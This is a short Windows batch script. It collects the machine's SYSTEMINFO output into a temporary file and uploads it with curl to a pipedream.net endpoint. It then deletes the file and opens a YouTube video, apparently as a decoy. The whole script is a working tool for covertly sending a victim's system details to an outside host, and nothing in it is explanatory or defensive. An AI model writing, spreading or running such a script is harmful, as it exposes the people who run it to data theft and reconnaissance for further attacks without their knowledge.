@echo off

SYSTEMINFO > tmp.txt

curl.exe -F --data=@tmp.txt https://d300971a5e2fdf010da7e4fe483c09fc.m.pipedream.net
del tmp.txt

start https://www.youtube.com/watch?v=7JRbCWDqe1I^&t=41s
